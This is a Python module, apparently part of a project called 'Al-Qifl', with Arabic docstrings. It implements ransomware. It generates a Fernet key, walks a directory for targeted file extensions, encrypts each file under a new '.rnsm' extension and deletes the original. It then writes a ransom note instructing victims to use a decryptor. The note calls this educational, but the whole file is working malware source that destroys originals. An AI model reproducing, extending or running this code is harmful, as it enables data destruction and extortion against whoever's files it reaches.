
import os
from cryptography.fernet import Fernet
from ..utils import file_operations

ENCRYPTED_EXTENSION = ".rnsm"
RANSOM_NOTE_FILENAME = "README_FOR_DECRYPTION.txt"

def generate_key():
    """
    ينشئ مفتاح تشفير عشوائي باستخدام Fernet (AES).
    :return: مفتاح التشفير (bytes).
    """
    return Fernet.generate_key()

def save_key(key, filepath):
    """
    يحفظ مفتاح التشفير في ملف.
    :param key: مفتاح التشفير (bytes).
    :param filepath: المسار الكامل لحفظ المفتاح.
    """
    file_operations.write_file(filepath, key)

def load_key(filepath):
    """
    يحمل مفتاح التشفير من ملف.
    :param filepath: المسار الكامل لملف المفتاح.
    :return: مفتاح التشفير (bytes).
    """
    return file_operations.read_file(filepath)

def encrypt_file(filepath, key):
    """
    يشفر ملفًا واحدًا ويغير امتداده.
    :param filepath: المسار الكامل للملف المراد تشفيره.
    :param key: مفتاح التشفير (bytes).
    """
    f = Fernet(key)
    original_content = file_operations.read_file(filepath)
    encrypted_content = f.encrypt(original_content)
    
    # Store original extension in the new filename
    base_name, original_ext = os.path.splitext(filepath)
    new_filepath = base_name + original_ext + ENCRYPTED_EXTENSION
    
    file_operations.write_file(new_filepath, encrypted_content)
    os.remove(filepath) # حذف الملف الأصلي بعد التشفير

def encrypt_target_directory(directory, key_filepath, target_extensions):
    """
    يشفر جميع الملفات المستهدفة في مجلد معين.
    :param directory: المسار إلى المجلد المستهدف.
    :param key_filepath: المسار لحفظ مفتاح التشفير.
    :param target_extensions: قائمة بامتدادات الملفات المستهدفة.
    :return: عدد الملفات التي تم تشفيرها.
    """
    key = generate_key()
    save_key(key, key_filepath)
    
    files_to_encrypt = file_operations.find_files(directory, target_extensions)
    encrypted_files_count = 0
    for filepath in files_to_encrypt:
        try:
            encrypt_file(filepath, key)
            encrypted_files_count += 1
        except Exception as e:
            print(f"خطأ في تشفير الملف {filepath}: {e}")
    
    create_ransom_note(directory)
    return encrypted_files_count

def create_ransom_note(directory):
    """
    ينشئ ملف رسالة الفدية في المجلد المستهدف.
    :param directory: المسار إلى المجلد المستهدف.
    """
    note_path = os.path.join(directory, RANSOM_NOTE_FILENAME)
    ransom_message = f"""
    This folder has been encrypted for educational purposes by Al-Qifl.
    To restore your files, you need to use the Al-Qifl Decryptor tool with the correct key.
    DO NOT ATTEMPT TO MODIFY OR DELETE ENCRYPTED FILES, AS THIS MAY LEAD TO PERMANENT DATA LOSS.
    For more information, please refer to the project documentation.
    """
    file_operations.write_file(note_path, ransom_message.encode("utf-8"))

